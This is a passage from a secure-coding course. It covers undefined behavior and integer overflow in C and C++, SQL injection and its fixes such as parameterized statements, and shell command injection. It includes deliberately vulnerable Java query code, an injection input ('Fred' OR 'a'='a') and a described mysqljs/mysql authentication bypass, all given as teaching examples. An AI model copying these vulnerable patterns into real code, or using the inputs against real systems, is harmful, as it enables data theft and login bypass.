🔔  Integer overflow or wraparound is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #12 and 2019 CWE Top 25 #8. It is [CWE-190](https://cwe.mitre.org/data/definitions/190.html), *Integer overflow or wraparound* (though this CWE also covers unsigned wraparound, which is defined in C and C++).

Perhaps by now it is clear why many people recommend avoiding C and C++ if the code has to be secure. For a variety of reasons, it is more difficult to write secure software in these languages! But again, there are *reasons* that people choose these languages, and of course, if something is already written in these languages, it is hard to change.

So, if you do use C and C++, there are ways you can reduce your risks. We have already discussed some options. Here are a few more:

* Read its standards carefully so that you know all common undefined behaviors and actively avoid them when writing code.

* Turn on warnings about undefined behaviors. Examples of such gcc and/or clang flags include **-fsanitize=signed-overflow** (warn about signed overflow), **-ftrapv** (traps signed integer overflows), **-fsanitize=address**, **-fsanitize=undefined**, and **-fcatch-undefined-behavior** (but it will not ALWAYS detect them!)

* Force the compiler to assign a meaning to officially undefined behaviors. You should not rely on these, but they will reduce the impact of making a mistake. Examples of such gcc and/or clang flags include **-fwrapv** (wrap integers on overflow), **-fno-delete-null-pointer-checks**, and **-fno-strict-overflow**.

We will later discuss using tools to try to detect these, but be warned: most tools at best detect *some* undefined behaviors, not all of them. Your best defense is to use a language with no or few undefined behaviors. Where that is not reasonable, know exactly what is not defined, and carefully write code so it does not depend on undefined behaviors.

#### Quiz 2.6: Avoid Undefined Behavior

\>\>In C and C++, a null pointer dereference is not a serious security problem, because you will just read a data value or, at worst, crash the program. True or False?<<

( ) True

(x) False

[Explanation]

No, in C and C++ a null pointer dereference is undefined behavior. Any undefined behavior could cause anything bad to happen, including erasing all files, displaying all secret keys, or anything else. It is more likely to cause a subtle problem, but that subtle problem could also be a serious security vulnerability.

[Explanation]

## Processing Data Securely: Calculate Correctly

### Avoid Integer Overflow, Wraparound, and Underflow

It’s common to calculate integers in programs, such as by continuously incrementing (adding 1 to) a variable. However, no computer can truly handle an infinite number of digits. In fact, many programming languages use a fixed number of bits in their most common integer types, so the minimum and maximum integers have a much smaller range than what could be represented by the computer.

If an attacker can cause an integer calculation to exceed the range of the integer’s representation, the result can be a vulnerability. Since integer calculations are common, and developers often forget that computers can’t actually handle an infinite number of digits, this is a relatively common vulnerability.

As we’ve already noted, in C and C++, you must write your program so that an attacker cannot cause the usual signed integer types (such as int) to overflow or underflow. A signed integer overflow or underflow is normally undefined behavior in C and C++, and the program is allowed to do anything at all when it occurs (including triggering a vulnerability).

In C and C++, overflowing or underflowing an unsigned integer wraps around in its underlying representation (typically two’s complement). So in C and C++ it’s typical that adding 1 to the largest representable unsigned value will produce 0. In many other programming languages, both signed and unsigned integers are stored in a fixed length and wrap around on overflow & underflow (typically in two’s complement). This is not always a good thing; if an attacker can cause an underflow or overflow, and if the program was not designed to handle it, the result can often be a vulnerability.

Some programming languages automatically switch to “big number” integer formats as needed to support an arbitrary number of digits, instead of using a fixed number of bits to represent an integer. These programming languages include Python, Ruby, and Scheme. Many other programming languages provide support for such formats, such as through a library, though you may need to specifically request using this format (e.g., as a type). These formats can’t really support an infinite number of digits, since no computer has infinite memory, but this does greatly reduce the risk of such problems. In many cases an exception is raised if the calculation runs out of space, so make sure the program can properly handle that exception. A common problem is that programs often need to call a routine written in a different programming language, and during that conversion the number may be converted to a fixed-width format that cannot store the value (thus recreating the problem).

The JavaScript programming language is an unusual case. The JavaScript specification, called ECMAScript, does not provide direct support for integers. Instead, integers are typically represented using floating point numbers. As noted in the ECMAScript language specification (section "The Number Type"), this means that JavaScript’s Number type can accurately represent all positive and negative mathematical integers whose magnitude is no greater than 2<sup>53</sup>. However, if an attacker can cause calculated integers to go beyond this range, odd things can happen. For example, incrementing a positive integer beyond this value is likely to produce an unchanged result, since the underlying type cannot store every digit. There are also some operators that only deal with integers in specific ranges (such as -2<sup>31</sup> through 2<sup>31</sup>-1 inclusive, or 0 through 2<sup>16</sup>-1 inclusive); make sure an attacker can’t cause those ranges to be exceeded before you call those operators. For more information see the [ECMAScript ® 2021 Language Specification](https://www.ecma-international.org/publications-and-standards/standards/ecma-262/) from ECMA.

One of the simplest ways to ensure an attacker cannot trigger vulnerabilities from integer overflows and underflows is to do input validation on all untrusted numbers. In all those input validation checks, enforce minimum and maximum values on all untrusted integers so that the accepted inputs cannot lead to a calculation that would trigger an integer overflow or underflow. If this is done, then there can’t be any such vulnerabilities. If this can’t be done, then the program needs to detect integer overflows and underflows that can be triggered by an attacker, either before or after the calculation, and handle them appropriately.

> 😱 STORY TIME: NetUSB CVE-2021-45608

> An example of an integer overflow leading to a vulnerability is [CVE-2021-45608](https://nvd.nist.gov/vuln/detail/CVE-2021-45608), as explained in “[CVE-2021-45608 | NetUSB RCE Flaw in Millions of End User Routers](https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/)” by Sentinel Labs.  The KCodes NetUSB kernel module, used by a large number of network device vendors, had an integer overflow vulnerability. The module took an untrusted client-provided length, added 0x11, and allocated that amount of memory. If the requested length was large (e.g., all 1s in binary), the addition would wrap around, causing a too-small allocation. After that, data would be dumped into the too-small buffer, leading to a buffer overflow.
>
> This shows that it’s important to check for wraparound when using attacker-controlled data, especially if you use it to make size or out-of-range decisions. Other rules can be learned as well. First, always validate data from an untrusted source (e.g., data from the Internet) - there was no reason to allow any allocation request this big. Second, this module listened to requests from the wide-area network (WAN) instead of just the local area network (LAN); software should minimize privilege to only what's needed to reduce the likelihood or impact of damage if there is a vulnerability.


🔔  Integer overflow or wraparound is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #12 and 2019 CWE Top 25 #8. It is [CWE-190](https://cwe.mitre.org/data/definitions/190.html), *Integer overflow or wraparound*.

#### Quiz 2.7: Avoid Integer Overflow, Wraparound, and Underflow

>>Integer overflows can be ignored when handling untrusted data. True or False?<<

( ) True
(x) False

[Explanation]
No. The range of possible values varies by language and types used, but attackers can sometimes exploit integer overflows.
[Explanation]


# Calling Other Programs

This chapter describes how to call other programs securely, including how to counter injection attacks (including SQL injection and OS command injection) and how to properly handle filenames/pathnames.

Learning objectives:

1. Discuss the basics of securely calling other programs.

2. Understand how to counter injection attacks (including SQL injection and OS command injection).

3. Discuss proper handling of filenames/pathnames.

## Introduction to Securely Calling Programs

### Introduction to Securely Calling Programs - The Basics

Very few programs are entirely self-contained; nearly all programs call out to other programs. This includes local programs, such as programs provided by the operating system, built-in software libraries for that language, and software from package repositories (like npm, PyPI, and maven). Modern systems often call out through a network to other services, making requests through various APIs (such as REST and GraphQL APIs) and receiving data in formats such as JSON and XML. Almost all of these programs then call other programs. Often, these indirect calls are not obvious (e.g., calling a library written by someone else) or involve a great deal of “hidden” infrastructure.

You need to be careful about what programs you choose to use (trust) and manage them (e.g., how you record and update them). Once you choose them, you must be careful about how you use these other programs. In this section, we are going to talk about securely *using* other programs.

First, the obvious: if a program is known to be insecure, and security matters, then don’t use it! But usually, you are not using a known-insecure program, so let’s move beyond that.

If there is a relatively easy way to limit privileges of the routine you are calling, do so. If you can *limit* the privileges given, then, if an attacker breaks through, the damage is more limited and it may make it harder for the attacker to cause more damage. This is another example of the security principle of least privilege. For example, if you are calling a database, try to limit database privileges of the program making the request. If you are using SQL, consider using the **GRANT** command so the requesting program has fewer privileges.

A useful principle is to only call a routine with valid values. If a routine requires that a number be 0 through 9, then it should not be possible for an attacker to cause 50 to be sent. This is easier in theory than in practice, especially since those limits are not always well-documented. But where you know of a limitation, consider doing some checks to make sure they are honored, or write your program so that the limitations are necessarily honored.

A very important principle is that if a routine is hard to use securely, and there is another way to do the task that is easier to do securely, *use the routine that is easier to use securely*. Here are some warning signs that you are using a routine that is hard to use securely:

* It executes whatever program is sent to it, and some data you send might come from an attacker. Any routine with a name like **eval()**, **exec()**, **execute()**, or **system()** has a high chance of being in this category. For example, don’t use **eval()** in JavaScript to process JSON data (in general!); use something safer like JavaScript’s function **JSON.parse()**.

* It requires you to concatenate constant strings with data that might come from an attacker. Generally, that other data from an attack has to be escaped, and it is easy to make a mistake when escaping data.

* Its input format is described using a language specification (such as Backus-Naur Form).

* It was intended for direct human interaction, not for a program to invoke it.

You *can* use such routines securely, and sometimes you need to. But if you can avoid it, your program will probably be more secure - and it will probably be easier to maintain, too. If you cannot avoid them, you may want to wrap their use in special wrappers to make them easier to use safely.

Why are certain kinds of routines hard to use securely? One common problem is that many routines accept languages with *metacharacters* - that is, characters that change how other characters are interpreted instead of being data themselves. For example, the double quote character (**“**) is often a metacharacter (including in SQL and shell). If there is a language specification, that almost certainly means there are metacharacters. Supporting metacharacters is very flexible, and if all of the input is trusted, it is not a problem. But when parts of the data might be from an attacker, you need to be very careful and take extra precautions. If an attacker can insert metacharacters into the input, and they are not escaped exactly correctly, then dangerous and easily-exploited vulnerabilities often follow if they are read by some kind of interpreter. These kinds of attacks are sometimes called injection attacks.

🔔 Vulnerabilities to injection attacks are such common mistakes in web applications that “Injection” is 2017 OWASP Top 10 #1 and 2021 OWASP Top 10 #3. 2021 CWE Top 25 #28 and 2019 CWE Top 25 #18 are identified [CWE-94](https://cwe.mitre.org/data/definitions/94.html), *Improper Control of Generation of Code (‘Code Injection’)*. 2021 CWE Top 10 #25 is [CWE-77](https://cwe.mitre.org/data/definitions/77.html), *Improper Neutralization of Special Elements used in a Command ('Command Injection')*. Both CWE-94 and CWE-77 are special cases of [CWE-74](https://cwe.mitre.org/data/definitions/74.html). *Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')*. The general category CWE-74 has other common special cases such as SQL injection vulnerabilities ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)) and operating system command injection ([CWE-78](https://cwe.mitre.org/data/definitions/78.html)) that we will soon discuss.

So you need to ensure that when you send data to some program (or output), you send it in a secure way. That may involve:

* **Sanitizing**<br>Removing any illegal or potentially-malicious character (usually metacharacters) from the data.

* **Escaping**<br>Modifying characters (some metacharacters) so that they are not interpreted incorrectly.

* **Normalizing**<br>Changing the form of data to be a common form (and, as a side-effect, preventing it from causing a security problem).

Where possible, use libraries and APIs that do this for you; they are easier to use securely.

Let’s now examine some common injection attack cases and how to handle them securely. Again, an injection vulnerability is when a program accepts data from an attacker and improperly hands that data to some command interpreter. Some of the most common problems occur when that data is sent to a database system (SQL injection attacks) or an operating system command interpreter (OS command injection attacks), so we will focus on those. Once you understand how to deal with these two common cases, it will be much clearer how to properly handle other interpreters we will not cover here (e.g., the Lightweight Directory Access Protocol (LDAP)). We will begin by discussing sending data to database systems, which are often vulnerable to SQL injection attacks.

#### Quiz 3.1: Introduction to Securely Calling Programs - The Basics

\>\>Just pick secure software to reuse, and your application will be secure. True or False?<<

( ) True

(x) False

[Explanation]

This is false. Clearly, if you pick known *insecure* software, you will have a problem. In addition, you should prefer software that’s easier to use securely. But in general, you need to *use* reused software in a secure way - not just pick secure components.

[Explanation]

## Calling Other Programs: Injection and Filenames

### SQL Injection

#### SQL Injection Vulnerability

![image alt text](exploits_of_a_mom.png)

**Exploits of a Mom**, retrieved from [xkcd.com](https://xkcd.com/327/), licensed under [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

Most database systems include a language that can let you create arbitrary queries, and typically many other functions too (e.g., creating and modifying things). The SQL language is especially common, and while some database systems use other languages, those other languages often have similarities with SQL. Such languages, including SQL, include metacharacters. When attackers can insert metacharacters into a SQL command to cause a security problem, the attack is called an *SQL injection attack*, and the vulnerability is called an *SQL injection vulnerability*. SQL injection is sometimes abbreviated as SQLi.

Even if the database language is not SQL, if it is an attack on a language for a database system it is often called an SQL injection attack (even though this is technically not accurate). We will focus on SQL, because SQL is very common and once you understand how to counter SQL injection attacks, it is easy to generalize this to any database language.

Here is a trivial example; here is a snippet of Java that tries to do an SQL query, but does it insecurely:

~~~~java
    String QueryString = "select * from authors where lastname = ' " + search_lastname + " '; "; // VULNERABLE CODE
    rs = statement.executeQuery(QueryString); // VULNERABLE CODE
~~~~

The intent is clear; if **search_lastname** has the value **Fred**, then the database will receive the query “**select * from authors where lastname='Fred';**” - a reasonable SQL query. But remember our warning signs - this code concatenates strings, some of that data is probably provided by an attacker, and we’re doing something called “execute”.  The warning signs are right. Imagine that the attacker provides the input “**Fred' OR 'a'='a**”. This will produce the query “**select * from authors where lastname='Fred' OR 'a'='a';**” and now the attacker can retrieve the entire database. The attacker could even modify or delete data this way, depending on various factors. This is a simple example of an SQL injection attack; an attacker can insert some characters and inject new or modified commands.

There are many ways to trigger SQL injection attacks; attackers can insert single quotes (used to surround constant character data), semicolons (which act as command separators), “**--**” which is a comment token, and so on. This is not a complete list; different database systems interpret different characters differently. For example, double quotes are often metacharacters, but with different meanings. Even different versions of the *same* database system, or different configurations, can cause changes to how the characters are interpreted. We already know we should not create a list of “bad” characters, because that is a denylist. We could create an allowlist of characters we know are not metacharacters and then escape the rest, but this process is hard to do correctly for SQL.

Don't concatenate strings to create a DBMS query, because that is insecure by default. That includes using format strings, string interpolations, string templates, and all other mechanisms that simply concatenate text. For example, the same vulnerabilities happen if you use Python formatted string literals (f-strings such as <tt>f'{year}-{month}'</tt>), Python's `.format` method, JavaScript's template strings (<tt>`${year}-${month}`</tt>), PHP's string interpolations (<tt>"${year}-${month}"</tt>), Ruby string interpolation (<tt>"#{year}-#{month}"</tt>), Go (string) templates, or any other string-based template or formatting language. Remember, we want to try to use a routine that is easy to use securely, and all of these are dangerous by default when used to create commands like SQL commands.

Many developers try to fix this in an unwise way by calling an escape routine on every value, e.g., like this:

~~~~java
    String QueryString = "select * from authors where lastname = ' " +
                         sql_escape(search_lastname) + " '; "; // BAD IDEA
~~~~

This approach (calling an escape routine every time you use untrusted input)
has a fundamental flaw: the *default* is insecure.
If an escape routine must be called every time untrusted data is used,
and there are many uses of untrusted data,
eventually someone will forget to call the escape function.
Many programs create many queries, so there are many opportunities to
forget to do it.
The mistake can happen at the beginning, or later when the code is modified,
but experience shows that the mistake *will* happen.

> 😱 STORY TIME: Heartland Payment Systems / SQL Injection

> In late 2007 attackers used a SQL injection attack to compromise the database of Heartland Payment Systems (aka "Heartland"). At the time Heartland processed 100 million payment card transactions per month for 175,000 merchants. The attackers used the SQL injection to insert code into Web scripts used by the Web login page. The attackers eventually used this accept to install a spyware program called a 'sniffer' that captured the card data as payments were processed for several months in 2008. As a result, Heartland temporarily lost its compliance with the Payment Card Industry Data Security Standard (PCI DSS), which was required to implement their core business of processing card payments. Heartland reportedly had to pay $145 million in compensation for fraudulent payments (["Data Breach Directions: What to Do After an Attack" by Diane Ritchey](https://www.securitymagazine.com/articles/86071-data-breach-directions-what-to-do-after-an-attack)). They have since taken many steps to make their systems stronger and more robust to try to prevent a recurrence.

🔔 SQL injection is a special case of injection attacks, and we have already noted that injection attacks are so common and dangerous that they are 2017 OWASP Top 10 #1. SQL injection specifically is such a common cause of security vulnerabilities that just SQL injection is 2021 CWE Top 25 #6 and 2019 CWE Top 25 #6. SQL injection is also identified as [CWE-89](https://cwe.mitre.org/data/definitions/89.html), *Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)*.

Again, we want to try to use an approach that is easy to use correctly - it needs to be secure by default.

For databases, there are well-known solutions that are far easier to use securely.

#### SQL Injection Solutions

SQL injection vulnerabilities are one of the most common and devastating vulnerabilities, especially in web applications. They are also easy to counter, once you know how to do it.

*Parameterized statements*, aka *parameterized queries*, are perhaps the best way to counter SQL injection attacks if you are directly creating SQL commands that need to be secure. Parameterized statements are statements that let you identify placeholders (often a “**?**”) for data that needs to be escaped. A pre-existing library that you call then takes those parameters and in effect escapes the data properly for that specific implementation. The exact syntax for placeholders depends on the library and/or database you're using.

For our purposes, a *prepared statement* compiles the statement with the database system ahead-of-time so that a later request with specific data can be executed more efficiently. Preparing a statement with a database ahead-of-time can improve performance if the statement will be executed multiple times. Prepared statement APIs generally include support for parameterized statements, and many people (and APIs) use the terms "prepared statement" and "parameterized statement" as synonyms.

For security, the key is to use an API with parameterized statements (including a prepared statement API) and ensure that every untrusted input is sent as a separate parameter. Make sure that you do *not* normally include untrusted input by concatenating untrusted data as a string (including a formatted string) into a request.

##### Advantages of parameterized/prepared statements

Most programming languages have at least one library that implements parameterized statements and/or prepared statements. Using parameterized statements, including by using prepared statements, has many advantages:

1. Since the library does the escaping for you, it is simpler to use and more likely to be right.

2. It tends to produce easier-to-maintain code, since the code tends to be easier to read.

3. Many can handle variation in different SQL engines (which is important because different systems often have different syntax rules).

##### Example: Prepared statements in Java

Here is an example of using prepared statements in Java
using its JDBC interface:

~~~~java
    String QueryString = "select * from authors where lastname = ?";
    PreparedStatement pstmt = connection.prepareStatement(QueryString);
    pstmt.setString(1, search_lastname);
    ResultSet results = pstmt.execute( );
~~~~

There are more statements than our earlier example, but the statements are simpler. In particular, the complicated concatenation is now a simple string constant. We still call something called “**execute**” - but remember, avoiding methods named “execute” is just a rule of thumb to help us detect potential problems.

Note: Some parameterized statement and/or prepared statement
libraries are not thread-safe. In other words,
some libraries assume that at any given time only a single thread can
access an instance.
This is true for the Java prepared statement API used here;
this Java API is not thread-safe. So when using this Java interface,
only define `PreparedStatement` objects as method-level variables
(instead of class-level variables) to reduce the risk of thread safety
problems, as suggested by
[*Bobby Tables* (Java)](https://bobby-tables.com/java).

Of course, like any technique, if you use it wrongly then it won’t be secure. Here is an example of how to use prepared statements in Java to produce a probably-insecure program:

~~~~java
    String QueryString = "select * from authors where lastname = '" + search_lastname + "';";
    PreparedStatement pstmt = connection.prepareStatement(QueryString);
    ResultSet results = pstmt.execute( ); // Probably insecure, don’t do this!
~~~~

This insecure program uses a prepared statement, but instead of correctly using “**?**” as a value placeholder (which will then be properly escaped), this code directly concatenates data into the query. Unless the data is properly escaped (and it almost certainly is not), this code can quickly lead to a serious vulnerability if this data can be controlled by an attacker.

##### Examples: Parameterized and Prepared Statements in some Other Languages

Parameterized and prepared statements are widely available, though the
APIs and placeholder syntax vary by programming language, library, and database.
Here we'll see some examples.

In Python there are several libraries that interface to databases.
Many of them implement the Python Database API Specification v2.0
([PEP 249](https://peps.python.org/pep-0249/)),
whose `execute` and `executemany` methods implement parameterized statements.
The library's placeholder syntax is reported by its `paramstyle` attribute.
Here's a simple Python example from the
Python sqlite3 library documentation
[Python (sqlite3)](https://docs.python.org/3/library/sqlite3.html):

~~~~python
    con = sqlite3.connect(...)
    cur = con.cursor()
    cur.execute("insert into test(d, ts) values (?, ?)", (today, now))
~~~~

Here's an example of a query in go from the [go.dev documentation on querying](https://go.dev/doc/database/querying):

~~~~go
    rows, err := db.Query("SELECT * FROM album WHERE artist = ?", artist)
~~~~

When using Node and JavaScript there are many ways to use
parameterized and prepared statements.
Here's an example using the node-postgres callback interface,
as described in the
[node-postgres documentation](https://node-postgres.com/features/queries):

~~~~javascript
    const text = 'INSERT INTO users(name, email) VALUES($1, $2) RETURNING *'
    const values = ['brianc', 'brian.m.carlson@gmail.com']
    client.query(text, values, (err, res) => { ....  })
~~~~

The PostgreSQL `libpq` C interface provides several functions, as
explained in the [PostgreSQL (Command Execution Functions) documentation](https://www.postgresql.org/docs/current/libpq-exec.html):

* `PQexec` directly runs a single string command and returns a result.
* `PQexecParams` implements a parameterized statement.
  Placeholders are represented in the command as `$1`, `$2`, etc.,
  and the parameter values are supplied as separate parameters in the same call.
* `PQprepare` implements a prepared statement.
  It takes a statement with placeholders and
  submits it to the database to be prepared.
  Users can later use the separate `PQexecPrepared` call
  to provide the placeholder parameter values and execute the resulting
  command.

The [OWASP Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html) and [Bobby Tables website](https://bobby-tables.com/) provide examples for a variety of ecosystems.

##### Subtle issues: DBMS (Server) side vs. Application (client) side

An important security issue is *where* the
parameters of a parameterized statement are processed.
There are two options, DBMS-side and application-side, and
DBMS-side is better from a security point of view.

From a security point-of-view it's best if the parameters of
parameterized statements are processed directly
within the database management system (DBMS),
aka "DBMS-side" parameter processing.
This approach is often called "server-side" since many DBMSs use a
client/server architecture where the client connects over a network
to a server-side DBMS.
There are many advantages to DBMS-side parameter processing.
The DBMS has the current information on escaping rules
(and can often use more efficient mechanisms than adding escape characters),
and it also has other information such the relevant character encodings
and expected data types.
Perhaps most importantly, the DBMS developers will typically have
security experts review this part of the DBMS system.
However, DBMS-side parameter processing can require more effort to
implement, so some libraries use
"application-side" parameter processing instead.

"Application-side" parameter processing occurs when the parameter escaping
occurs within a library *not* in the DBMS, but instead in the application's
processing space.
This is also called "client-side" parameter processing.
Application-side parameter processing systems generally are implemented
by directly inserting escape characters where they are needed.
Application-side parameter processing is often easier to implement, so
several DBMS libraries use this approach.
Application-side libraries are better than directly calling an escape
mechanism "by hand" on every use since the escapes are automatically added.

Unfortunately, application-side parameter processing has a weakness:
the application side may interpret information differently than the DBMS.
This weakness can lead to vulnerabilities. For example:

1. The application-side library may be intended for a different
   version of the DBMS. The DBMS may have a different list of characters
   or situations that need to be escaped.
2. The application-side library may interpret multi-byte characters
   differently or not escape multi-byte characters correctly for the
   circumstance that actually exists on the DBMS side. (See
   [Multibyte character exploits PHP/MySQL](https://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql).)
3. If the application-side library implements parameterization of
   data types more complex than numbers and strings (such as arrays,
   objects, associative arrays, and/or dictionaries), then there
   is a significant risk of a vulnerability.
   The fundamental problem is that the application-side library isn't
   parsing the query language the same way that the DBMS would -
   it is doing simple text substitutions. So if the library implements this
   functionality, it must typically make *guesses* of what types are expected.
   For example, it may guess that associative arrays are only sent
   to the library when that is sensible in the parameterized SQL query.
   That guess, sadly, may be exploitable.
   This is especially a risk in languages that don't require static types
   (compile-time knowledge of types), as it's much easier to get unexpected
   complex types into a library that cannot always handle them securely.
   For example, the widely-used Node.js MySQL library
   [mysqljs/mysql](https://github.com/mysqljs/mysql)
   as of early 2022 is often exploitable through its parameterized library
   *if* a JavaScript object can be sent as a parameter to it
   (see
   [Finding an Authorization Bypass on my Own Website](https://maxwelldulin.com/BlogPost?post=9185867776) by Maxwell Dulin (ꓘ)).

That last issue for application-side processing
(that complex data types may not always be escaped properly)
can be confusing, so an example may help.
In the Node.js mysqljs/mysql library,
imagine that an attacker manages to provide
the JavaScript *object* `{password = 1}` as the password parameter
(this is not just a string, but an actual JavaScript object).
Now imagine that this object is used in the SQL query
<tt>SELECT &#42; FROM accounts WHERE username = ? AND password = ?</tt>
(note that this is parameterized).
The library will internally expand the expression after `AND`
into <tt>password = &#96;password&#96; = 1</tt> because the library does simple
text replacement of the second `?`, without noticing that a JavaScript object
doesn't make sense in the context of this query (a string or number would
be expected here).
The MYSQL DBMS will interpret <tt>password = &#96;password&#96;</tt>
as 1 (true), and then determine that `1 = 1` is true.
The result: this expression will *always* be true.
This incorrect escaping of a complex data type
is enough to completely bypass authentication in some situations.

Unfortunately, this last issue can be a challenge to solve:

1. The safe solution is to make sure that complex data types
   (types other than numbers and strings) are not expanded by
   application-side libraries
   unless the developer specifically marks them as allowed.
   This may be impractical if the application already depends on this,
   and the library might not provide a way to fully disable the functionality.
   For example, mysqljs/mysql allows setting `stringifyObjects` to true
   when calling `mysql.createConnection`, but while this can help,
   this only disables escaping generic Objects - it does not
   disable other complex data types such as arrays.
2. The general solution is to verify every type before calling the library.
   For example, require that all data expected to be strings must be strings.
   This is typically easy to do in a statically typed language
   if the language enforces the types - just declare the required type.
   This can take a lot of time to implement in languages that don't
   enforce static types, and there is also the
   risk of missing a check when creating or modifying the code.
   However, this approach is more flexible.
   (See ["Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql"](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4) by Flatt Security Inc., 2022-02-21.)

It's often hard to determine if a library uses DBMS-side or
application-side parameterization, and in some circumstances
only an application-side approach is available.
In some cases requesting a prepared statement forces the library to
use DBMS-side processing, but don't assume it - check the documentation.
If you have a practical choice, prefer a DBMS-side implementation.

##### Stored Procedures

Many database systems support "stored procedures", that is,
procedures embedded in the database itself.
If you use stored procedures, and commands (such as queries)
are dynamically constructed in them, then you can again have
SQL injection vulnerabilities.

Again, the best solution is usually to use a parameterized query mechanism
when creating the dynamic command (e.g., the SQL) inside the
stored procedure. Be careful; in some systems using them correctly
can be a little tricky.

For more information on using parameterized queries
in stored procedures, see your library's documentation, the
[OWASP Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html#stored-procedure-examples), and the
[OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

##### When Parameterized Statements Won't Work

In some situations parameterized statements (including
prepared statements) will *not* work.
Many parameterized statement APIs only allow replacing SQL values, so
they do not allow varying information such as the names of tables, the names
of columns, or the sort order direction.

In those cases you may need to create a query by concatenating data.
In those cases, make *sure* you carefully validate the data (using an allowlist)
so only specific and safe values are allowed.
Often the allowlist is a short list of permitted values, or at most
a simple expression that only allows ASCII letters and digits.
A risk with this approach is that if the validation
is ever skipped (e.g., after some code change),
the system may become extremely vulnerable.

The [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
has a nice suggestion: if you *must* do this concatenation,
make the user input *different* from what you will actually use, and
in the program map the user input to the values you will use.
If user input doesn't have a valid mapping, reject the input.
This increases the probability that a change to the program
will not result in unvalidated input being concatenated into a query,
or that the problem will be detected before shipping.
For example, in Python, if you need to write to a user-provided table name, you can do the following:

~~~~python
    table_name_untrusted = request.get("table_name")  # This is untrusted, don't put this directly in the query!
    table_name_map = {"table1": "db.table1", "table2": "db.table2"}
    table_name = table_name_map[table_name_untrusted]
    con = sqlite3.connect(...)
    cur = con.cursor()
    cur.execute(f"insert into {table_name}(d, ts) values (?, ?)", (today, now)) # This is safe because we know that table_name can only take trusted values from table_name_map
~~~~

##### Other Approaches for Countering SQL Injection

Many programs use object-relational mapping (ORM). This is just a technique to automatically convert data in a relational database into an object in an object-oriented programming language and back; lots of libraries and frameworks will do this for you. This is fine, as long as the ORM is implemented using parameterized statements or something equivalent to them. In practice, any good ORM implementation will do so. So if you are using a respected ORM, you are already doing this. That said, it is common in systems that use ORMs to occasionally need to use SQL queries directly… and when you do, use parameterized statements or prepared statements.

Some applications use a "query builder" library to build commands (queries) programmatically through a sequence of calls instead of embedding a command string. Some ORMs include a query builder system. Again, a well-implemented query builder will use parameterized statements or similar internally. So if you use a query builder, use one that is implemented using parameterized statements, and provide untrusted data as separate parameters so the query builder can use the parameterized statements correctly.

There are other approaches, of course. You can write your own escape code, but this is difficult to get correct, and typically a waste of time since there are usually existing libraries to do the job.

In summary, properly using parameterized statement libraries makes it much easier to write secure code. In addition, they typically make code easier to read, automatically handle the variations between how databases escape things, and sometimes they are faster than doing metacharacter escapes yourself.

#### Quiz 3.2: SQL Injection

\>\>Parameterized statements (including prepared statements) are a valuable countermeasure against SQL injection, but you have to use placeholders for every data value that might possibly be controllable by an attacker. True or False?<<

(x) True

( ) False

### OS Command (Shell) injection

Another kind of injection attack is the operating system (OS) injection attack, also known as a shell injection attack. This is similar to an SQL injection attack; the problem is that information (usually text), some of it trusted and some from an attacker, is sent to an interpreter that executes what it is sent. The difference is that instead of being sent to a database, this mixture is sent to the OS command interpreter, aka the command shell.

Most systems have at least one command shell. Even small embedded systems, like televisions and routers, often have a command shell inside. Shells are useful for many things, including quickly combining programs, doing some queries, debugging, and so on. Many Unix-like systems, including typical Linux distributions, have multiple shells available including bash, dash, ksh, zsh, and csh; at least one of those is installed as **/bin/sh** or **/usr/bin/sh**. MacOS similarly comes with a shell and others can be easily installed. Windows systems typically use different shells with very different syntax (**cmd.exe**, **command.exe**, or PowerShell), but they have shells too.

A shell is a program that directly takes commands and runs programs as commanded. Since this is useful, many programming languages make it easy to call out to a shell. In particular, many languages have a way to dynamically construct a call to a shell and then execute it. However, it is easy to make mistakes when combining attacker data into a command to be run by a shell. In particular, try to avoid dynamically creating a mixture of commands and attacker-provided data to then be executed by the shell. Instead, try to find an alternative that is easier to use securely.

If all you want to do is call another program and pass it some parameters, try to do that without dynamically creating and then interpreting a shell command at all! Instead, try to call the program directly. This is more efficient anyway, and this is far easier (and more likely) to be secure if any of those parameters might include data from an attacker. For example:

* In C, prefer **execve(3)** (it does not use the shell) instead of using **system(3)** (which does use the shell).

* In Python, prefer using **shell=False** (the default) with **subprocess.run()** or  **subprocess.call()**, instead of using **shell=True** or **os.system()**

* In JavaScript Node.js, prefer using **shell=False** (the default) with **child_process.spawn()** or **child_process.execFile()** instead of using **shell=True** or **child_process.exec()**

In short: if you see code that concatenates strings (including formatted strings) for execution by a shell, and that concatenation includes untrusted input, be extremely concerned. While it is possible to do this securely, it is better avoided when you reasonably can.

If you must call a program through a shell, and also include some data that might be provided by an attacker, you need to use it securely. That is actually rather tricky. As always, *do not use a denylist*. There are many “lists of shell metacharacters” that are wrong because they miss some. So if you are sending data through a shell, you need to escape every character except for ones on an allowlist (characters you know are *not* metacharacters). Generally, A-Z, a-z, and 0-9 are not metacharacters, and after that, check very carefully. Make sure you quote everything as needed.

Of course, if you are calling a program with any data that might be from an attacker, you need to make sure that the data will not be misinterpreted. For example, make sure your command-line options will be correctly interpreted; if an attacker can cause the initial character to be “**-**” or “**/**” in a parameter, then they might be misinterpreted as an option or root directory. Anything passed in (e.g., by parameter or anything else) must be carefully escaped to prevent attack. This brings us to the topic of filenames, which we will cover next.

🔔 OS command injection is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #11 and 2021 CWE Top 25 #5. It is [CWE-78](https://cwe.mitre.org/data/definitions/78.html), *Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)*.

